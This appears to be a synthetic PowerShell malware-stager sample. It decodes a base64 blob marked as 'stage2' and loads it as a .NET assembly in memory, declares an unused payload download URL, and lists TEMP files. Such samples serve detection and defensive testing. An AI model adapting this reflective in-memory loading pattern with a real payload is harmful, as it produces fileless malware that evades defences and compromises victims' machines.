[CmdletBinding()]
param(
    [string]$DownloadUrl = 'https://example.com:443/payload.bin',
    [int]$TimeoutSec = 103
)
$ErrorActionPreference = "Stop"

try {
    $AssemblyBytes = [Convert]::FromBase64String('c3RhZ2UyLW1hcmtlcjplcjN0dmJncXh1')
    Write-Verbose ("Assembly byte count: " + $AssemblyBytes.Length)
    $OperationResult = [Reflection.Assembly]::Load($AssemblyBytes)
    if ($null -ne $OperationResult) {
        Write-Verbose ("Loaded assembly: " + $OperationResult.FullName)
    }
}
catch {
    Write-Warning "Assembly load failed: $($_.Exception.Message)"
}

Get-ChildItem -Path $env:TEMP -Filter "*.tmp" | Select-Object -First 3
